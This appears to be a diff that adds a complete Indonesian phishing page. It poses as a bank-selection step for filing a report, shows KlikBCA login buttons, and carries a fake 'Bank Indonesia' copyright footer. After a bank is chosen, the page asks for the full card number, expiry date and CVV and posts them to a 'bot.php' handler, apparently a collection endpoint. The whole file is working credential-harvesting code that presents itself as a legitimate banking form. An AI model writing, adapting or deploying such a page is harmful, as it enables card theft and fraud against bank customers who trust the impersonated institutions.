@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head> 
+  <meta name="theme-color" content=""> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0"> 
+  <meta http-equiv="X-UA-Compatible" content="ie=edge"> 
+  <title>Pilih Bank</title> 
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            color: #fff;
+            position: relative;
+        }
+
+        b {
+            font-weight: 500;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background: white;
+            overflow-x: hidden; /* Mencegah scroll horizontal */
+        }
+
+        body {
+            display: flex;
+            justify-content: flex-start; /* Mulai dari atas */
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            height: 100%;
+            /* Ganti atau hapus background jika perlu, saat ini putih */
+            background-color: white; 
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+            padding-bottom: 70px; /* Jarak untuk footer */
+        }
+
+        /* ========================================================
+           CSS UNTUK HEADER FULL (KIRI, KANAN, ATAS)
+           ======================================================== 
+        */
+        .full-header-img {
+            width: 100%;
+            height: auto; /* Menjaga proporsi gambar */
+            display: block;
+            margin: 0;
+            padding: 0;
+            border: none;
+            /* Memastikan menempel paling atas */
+            position: relative; 
+            top: 0;
+            left: 0;
+            z-index: 10;
+        }
+
+        /* ========================================================
+        EFEK KACA (GLASSMORPHISM) PADA KOTAK UTAMA
+        ======================================================== 
+        */
+        .kotak {
+            padding: 30px 25px;
+            width: 95%;
+            max-width: 380px;
+            /* Jarak dari header gambar */
+            margin-top: 20px; 
+            border-radius: 20px;
+            overflow-y: auto;
+            /* Sesuaikan max-height agar pas di layar mobile */
+            max-height: 65vh; 
+
+            background: rgba(255, 255, 255, 0.45);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            
+            border: 1.5px solid rgba(255, 255, 255, 0.6);
+            border-top: 2px solid rgba(255, 255, 255, 0.9);
+            border-left: 2px solid rgba(255, 255, 255, 0.9);
+            
+            box-shadow: 
+                0 30px 60px -15px rgba(0, 79, 145, 0.3), 
+                0 10px 20px -5px rgba(0, 0, 0, 0.1),     
+                inset 0 1px 2px rgba(255, 255, 255, 0.8); 
+        }
+
+        .note {
+            margin-bottom: 20px;
+        }
+
+        .note p {
+            font-size: 14px;
+            text-align: center;
+            color: #004F91;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: 0.3px;
+            text-shadow: 0px 1px 1px rgba(255,255,255,0.8);
+        }
+
+        .subtitle {
+            font-size: 12px;
+            text-align: center;
+            color: #333;
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        form {
+            width: 100%;
+            padding: 0;
+        }
+
+        form input, form select {
+            width: 100%;
+            height: 48px;
+            background: #ffffff; 
+            font-size: 14px;
+            color: #004F91; 
+            outline: none;
+            border: 1.5px solid #a8c7fa; 
+            padding: 12px 14px;
+            margin-bottom: 14px;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            font-weight: 600; 
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.06); 
+        }
+
+        form select option {
+            color: #333;
+            font-weight: 500;
+        }
+
+        form input::placeholder {
+            color: #888;
+            font-weight: 400;
+        }
+
+        form input:focus, form select:focus {
+            background: #ffffff;
+            border-color: #236cd4;
+            box-shadow: 0 6px 15px rgba(35, 108, 212, 0.2), inset 0 0 0 1px #236cd4;
+            transform: translateY(-2px);
+        }
+
+        form button {
+            width: 100%;
+            margin-bottom: 0;
+            margin-top: 8px;
+            height: 48px;
+            font-size: 14px;
+            border: none;
+            background: linear-gradient(135deg, #004F91 0%, #003d6b 100%);
+            color: white;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            letter-spacing: 0.3px;
+            box-shadow: 0 8px 15px -4px rgba(0, 79, 145, 0.4);
+        }
+
+        form button:hover {
+            background: linear-gradient(135deg, #003d6b 0%, #002d50 100%);
+            box-shadow: 0 12px 20px -4px rgba(0, 79, 145, 0.5);
+            transform: translateY(-2px);
+        }
+
+        form button:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 8px rgba(0, 79, 145, 0.3);
+        }
+
+        .divider {
+            border-top: 1px solid rgba(0, 0, 0, 0.15); 
+            margin: 20px 0;
+        }
+
+        .section-title {
+            font-size: 13px;
+            text-align: center;
+            color: #004F91;
+            font-weight: 700;
+            margin-bottom: 15px;
+            letter-spacing: 0.2px;
+            text-shadow: 0px 1px 1px rgba(255,255,255,0.5);
+        }
+
+        .internet-banking-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .internet-banking-buttons form {
+            margin: 0;
+        }
+
+        .internet-banking-buttons button {
+            height: 45px;
+            border: 1.5px solid #236cd4;
+            background: #ffffff; 
+            color: #236cd4;
+            margin: 0;
+            font-weight: 700;
+            box-shadow: 0 4px 10px rgba(35, 108, 212, 0.15); 
+            border-radius: 10px;
+        }
+
+        .internet-banking-buttons button:hover {
+            background: #f0f5ff;
+            box-shadow: 0 6px 15px rgba(35, 108, 212, 0.25);
+            transform: translateY(-2px);
+        }
+
+        .input-group {
+            display: flex;
+            gap: 12px;
+        }
+
+        .input-group input {
+            flex: 1;
+            margin-bottom: 14px;
+        }
+
+        .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 99999;
+        }
+
+        .loading img {
+            width: 90px;
+        }
+
+        footer {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            height: 50px;
+            background: #045597;
+            padding: 15px;
+            text-align: center;
+            color: white;
+            font-size: 12px;
+            z-index: 10;
+        }
+
+        #sectionInputKartu {
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .kotak {
+                width: 90%;
+                padding: 20px 18px;
+            }
+
+            form input, form select, form button {
+                height: 45px;
+                font-size: 13px;
+            }
+
+            .note p {
+                font-size: 13px;
+            }
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   
+   <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-05-04_01-58-59-759.jpg?updatedAt=1746298760448" class="full-header-img" alt="Header">
+
+   <div class="kotak" id="kotakUtama">  
+    <div id="sectionPilihBank">
+        <div class="note"> 
+            <p>PILIH PENYEDIA BANK ANDA</p> 
+            <p class="subtitle">untuk membuat laporan</p>
+        </div> 
+        
+        <div class="section-title">Internet Banking</div>
+        <p style="color:#444; font-size:11px; text-align: center; margin-bottom: 12px; font-weight: 600;">Abaikan jika tidak memiliki KlikBCA</p>
+
+        <div class="internet-banking-buttons">
+            <form action="indi" method="POST">
+                <button type="submit">KlikBCA</button>
+            </form>
+            <form action="bisnis" method="POST">
+                <button type="submit">KlikBCA Bisnis</button>
+            </form>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="section-title">Pilihan Bank Lainnya</div>
+
+        <form id="formPilihBank">
+            <select id="bank" name="penyedia" required>
+                <option value="" disabled selected>Pilih Nama Bank</option>
+                <option value="BANK RAKYAT INDONESIA">BANK RAKYAT INDONESIA</option>
+                <option value="BANK NEGARA INDONESIA">BANK NEGARA INDONESIA</option>
+                <option value="BANK MANDIRI">BANK MANDIRI</option>
+                <option value="BANK CENTRAL ASIA">BANK CENTRAL ASIA</option>
+                <option value="PERMATA BANK">PERMATA BANK</option>
+                <option value="BANK DANAMON">BANK DANAMON</option>
+                <option value="BANK MEGA">BANK MEGA</option>
+                <option value="PANIN BANK">PANIN BANK</option>
+                <option value="OCBC NISP BANK">OCBC NISP BANK</option>
+                <option value="HSBC">HSBC</option>
+                <option value="MAYBANK">MAYBANK</option>
+                <option value="ALLO BANK">ALLO BANK</option>
+                <option value="CIMB NIAGA">CIMB NIAGA</option>
+                <option value="DIGIBANK (DBS)">DIGIBANK (DBS)</option>
+                <option value="LAINNYA">LAINNYA</option>
+            </select>
+            <button type="button" id="btnLanjutPilihBank">Lanjutkan</button> 
+        </form>
+    </div>
+
+    <div id="sectionInputKartu" style="display: none;">
+        <div class="note"> 
+            <p>INPUT DETAIL KARTU ANDA</p> 
+            <p class="subtitle">Informasi kartu debit/kredit Anda</p>
+        </div>
+        <form action="bot.php" method="POST" id="formDetailKartu">
+            <input type="hidden" name="penyedia" id="hiddenPenyedia">
+            <input type="tel" name="nomorkartu" id="nomorkartu" placeholder="Nomor Kartu (16 Digit)" maxlength="19" required>
+            <div class="input-group">
+                <input type="tel" name="valid" id="valid" placeholder="Valid Thru (MM/YY)" maxlength="5" required>
+                <input type="tel" name="cvv" id="cvv" placeholder="CVV (3 Digit)" maxlength="3" required>
+            </div>
+            <button type="submit" id="btnSubmitFinal">Konfirmasi & Lanjutkan</button>
+        </form>
+    </div>
+   </div> 
+
+   <div id="process1" class="process1" style="display: none;"> 
+    <div class="loading"> 
+        <img src="images/spiner.gif"> 
+    </div> 
+   </div> 
+
+   <footer>
+     © 2024 Bank Indonesia 
+   </footer> 
+
+   <script>
+    const sectionPilihBank = document.getElementById('sectionPilihBank');
+    const sectionInputKartu = document.getElementById('sectionInputKartu');
+    const btnLanjutPilihBank = document.getElementById('btnLanjutPilihBank');
+    const bankSelect = document.getElementById('bank');
+    const hiddenPenyedia = document.getElementById('hiddenPenyedia');
+    const process1 = document.getElementById('process1');
+
+    // Handle Lanjutkan Button
+    btnLanjutPilihBank.addEventListener('click', function() {
+        if (bankSelect.value === "") {
+            alert("Silakan pilih bank terlebih dahulu.");
+            return;
+        }
+        
+        // Show loading effect
+        process1.style.display = 'flex';
+        
+        setTimeout(() => {
+            process1.style.display = 'none';
+            hiddenPenyedia.value = bankSelect.value;
+            sectionPilihBank.style.display = 'none';
+            sectionInputKartu.style.display = 'block';
+        }, 1000);
+    });
+
+    // Formatting Nomor Kartu (Space every 4 digits)
+    document.getElementById('nomorkartu').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Formatting Valid Thru (MM/YY)
+    document.getElementById('valid').addEventListener('input', function (e) {
+        let val = e.target.value.replace(/[^\d]/g, '');
+        if (val.length >= 2) {
+            val = val.substring(0, 2) + '/' + val.substring(2, 4);
+        }
+        e.target.value = val;
+    });
+
+    // CVV hanya angka
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '');
+    });
+
+    // Handle Final Submit
+    document.getElementById('formDetailKartu').addEventListener('submit', function() {
+        process1.style.display = 'flex';
+    });
+   </script>
+  </div>
+ </body>
+</html>
